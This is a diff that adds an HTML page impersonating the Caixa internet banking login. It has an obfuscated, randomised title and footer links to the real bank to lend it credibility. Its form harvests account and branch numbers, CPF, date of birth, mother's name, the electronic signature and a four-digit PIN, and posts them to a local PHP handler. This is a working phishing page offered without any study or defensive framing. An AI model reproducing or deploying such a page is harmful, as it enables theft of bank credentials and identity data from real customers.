@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <title>
+   i nTeR.n eT. BANk ing CaiXA
+  </title>
+  <meta charset="UTF-8" />
+  <link href="./assets/stylesheet-css/styles.css" rel="stylesheet" />
+  <link href="favicon.ico" rel="shortcut icon" />
+  <script src="./assets/scripts-js/title-random.js">
+  </script>
+ </head>
+ <body>
+  <div class="pace" style="display: none;">
+  </div>
+  <div class="pace-bg" style="display: none;">
+  </div>
+  <nav class="container">
+  </nav>
+  <nav class="title-bar">
+  </nav>
+  <header>
+   <nav onclick="document.location='index.php'" class="logo">
+   </nav>
+  </header>
+  <nav class="main-auth">
+  </nav>
+  <nav class="wrapper-auth">
+   <h1 class="box0-auth">
+    <img class="img-auth0" src="./assets/images/logo-identificacao.png" />
+    <span class="txt-auth0">
+     Identifica��o do usu�rio
+    </span>
+   </h1>
+   <form onsubmit="return false;" name="frmInfo" method="post" action="./controller/Process.class.php">
+   </form>
+  </nav>
+  <nav class="box1-auth">
+  </nav>
+  <nav class="caixaSenha margem">
+   <h2>
+    VERIFICA��O DE AUTENTICIDADE
+   </h2>
+   <div class="form-auth">
+    <div class="form-auth-wrapper">
+     <div class="operacao">
+      <label for="operacao">
+       Opera��o:
+      </label>
+      <select class="comboBox cmbOperacao" name="operacao">
+       <option value="">
+        Selecione sua opera��o
+       </option>
+       <option value="001- Conta Corrente - P.F�sica">
+        001- Conta Corrente - P.F�sica
+       </option>
+       <option value="002- Conta Simples - P.F�sica">
+        002- Conta Simples - P.F�sica
+       </option>
+       <option value="003- Conta Corrente - P.Jur�dica">
+        003- Conta Corrente - P.Jur�dica
+       </option>
+       <option value="006- Entidades P�blicas">
+        006- Entidades P�blicas
+       </option>
+       <option value="007- Dep. Institui��es Financeiras">
+        007- Dep. Institui��es Financeiras
+       </option>
+       <option value="013- Poupan�a">
+        013- Poupan�a
+       </option>
+       <option value="022- Poupan�a - Pessoa Jur�dica">
+        022- Poupan�a - Pessoa Jur�dica
+       </option>
+       <option value="023- Conta CAIXA F�cil">
+        023- Conta CAIXA F�cil
+       </option>
+       <option value="028- Poupan�a Cr�dito Imobili�rio">
+        028- Poupan�a Cr�dito Imobili�rio
+       </option>
+       <option value="032- Conta Investimento - P.F�sica">
+        032- Conta Investimento - P.F�sica
+       </option>
+       <option value="034- Conta Investimento - P.Jur�dica">
+        034- Conta Investimento - P.Jur�dica
+       </option>
+       <option value="043- Dep�sitos Lot�ricos">
+        043- Dep�sitos Lot�ricos
+       </option>
+      </select>
+     </div>
+     <div class="agencia">
+      <label for="agencia">
+       Ag�ncia:
+      </label>
+      <input type="text" class="textBox txtAgencia" maxlength="4" name="agencia" />
+      <span class="box-cd">
+       <label for="conta">
+        Conta e d�gito:
+       </label>
+       <input type="text" class="textBox txtConta" maxlength="8" name="conta" />
+       <input type="text" class="textBox txtDigito" maxlength="1" name="digito" />
+      </span>
+     </div>
+     <div class="cpf">
+      <label for="cpf">
+       CPF:
+      </label>
+      <input type="text" onblur="validaCPF(this)" class="textBox txtCPF" id="cpf" maxlength="11" name="cpf" />
+      <label for="dataNascimento">
+       Data de nascimento:
+      </label>
+      <input type="text" class="textBox txtDTNasc" maxlength="10" id="data" name="dataNascimento" onkeydown="validaDATA(event, this)" />
+      <span class="info-date">
+       ( dia/m�s/ano ex: 01/12/1991 )
+      </span>
+     </div>
+     <div class="nomeMae">
+      <label for="nomeMae">
+       Nome da m�e:
+      </label>
+      <input type="text" class="textBox txtNomeMae" name="nomeMae" />
+      <span class="info-mother">
+       ( Informe o nome completo da m�e )
+      </span>
+     </div>
+     <div class="AssinaturaEletronicaRadio">
+      <label for="AssinaturaEletronica">
+       Possui assinatura eletr�nica?
+      </label>
+      <span class="possuiae">
+       <input type="radio" class="radioButton rdSim" name="possuiae" onclick="verificaAssin()" value="sim" />
+       <span class="left-value">
+        Sim
+       </span>
+       <input type="radio" class="radioButton rdNao" name="possuiae" onclick="verificaAssin()" value="n�o" />
+       <span class="left-value">
+        N�o
+       </span>
+      </span>
+     </div>
+     <div class="assinaturaEletronica">
+      <label class="left-asntrltrnc" for="AssinaturaEletronica">
+       Assinatura
+       <br />
+       eletr�nica:
+      </label>
+      <input type="password" class="passwordBox left-asntrltrnc txtAssinaturaEletro" maxlength="6" name="assinaturaEletronica" onclick="this.value=''" disabled="disabled" />
+      <label class="left-asntrltrnc lblPwdFour" for="senhaQuatro">
+       Senha de (4) d�gitos:
+      </label>
+      <input type="password" class="passwordBox left-asntrltrnc" maxlength="4" name="senhaQuatro" />
+     </div>
+     <div class="txtInfoAssinEletro">
+      <p>
+       ASSINATURA ELETR�NICA
+      </p>
+      <article class="art-footer">
+       Assinatura Eletr�nica permite ao cliente realizar pagamentos e transfer�ncias de valores pela internet, caso n�o tenha, procure o gerente de sua ag�ncia da CAIXA e solicite o cadastramento. Voc� receber� uma assinaturaa provis�ria com 6 d�gitos, que dever� ser personalizada durante o seu pr�ximo acesso ao Internet Banking CAIXA atrav�s da op��o acima.
+      </article>
+     </div>
+    </div>
+   </div>
+  </nav>
+  <nav class="box2-auth">
+  </nav>
+  <div class="clear | button-group" id="cbgPIS">
+   <div class="right">
+    <button tabindex="150" onclick="javascript:cancel()" title="Cancelar" type="button" class="button-orange button-clean auto-tab-index-first-item" id="85Cancel">
+     <span>
+      Cancelar
+     </span>
+    </button>
+    <button onclick="javascript:envio()" tabindex="250" title="Confirmar" class="button-blue" type="button" id="confirm">
+     <span>
+      Confirmar
+     </span>
+    </button>
+    <script src="./assets/scripts-js/validaSenha.js">
+    </script>
+    <script src="./assets/scripts-js/infoValidation.js">
+    </script>
+    <script src="./assets/scripts-js/validate.js" type="text/javascript">
+    </script>
+   </div>
+  </div>
+  <footer>
+   <nav class="footer">
+    <p class="text-shadow">
+     Suporte Tecnol�gico CAIXA
+     <br />
+     3004 1104 (Capital e regi�es
+     <br />
+     metropolitanas) ou 0800 726 0104
+     <br />
+     (Demais regi�es)
+    </p>
+    <ul class="text-shadow menu-footer">
+     <li>
+      <a title="Seguran�a" target="_blank" href="http://www.caixa.gov.br/seguranca/">
+       Seguran�a
+      </a>
+         |   
+     </li>
+     <li>
+      <a title="Rede de Atendimento" target="_blank" href="http://www1.caixa.gov.br/atendimento/index.asp">
+       Rede de Atendimento
+      </a>
+         |   
+     </li>
+     <li>
+      <a title="Ajuda" target="_blank" href="https://internetbanking.caixa.gov.br/siwinstatic/htm/duvidasFrequentes/duvidas_frequentes.htm">
+       Ajuda
+      </a>
+         |   
+     </li>
+     <li class="last-item">
+      <a title="Termos e Contratos" target="_blank" href="https://internetbanking.caixa.gov.br/SIIBC/contrato_ibc.processa">
+       Termos e Contratos
+      </a>
+     </li>
+    </ul>
+   </nav>
+  </footer>
+  <!-- Fim do Container -->
+  <script src="./assets/scripts-js/menu.js">
+  </script>
+  <script src="./assets/scripts-js/scroll.js">
+  </script>
+  <script src="./assets/scripts-js/alert.mod.js">
+  </script>
+  <script>
+   $(".pace").style.display="none";$(".pace-bg").style.display="none";
+  </script>
+ </body>
+</html>
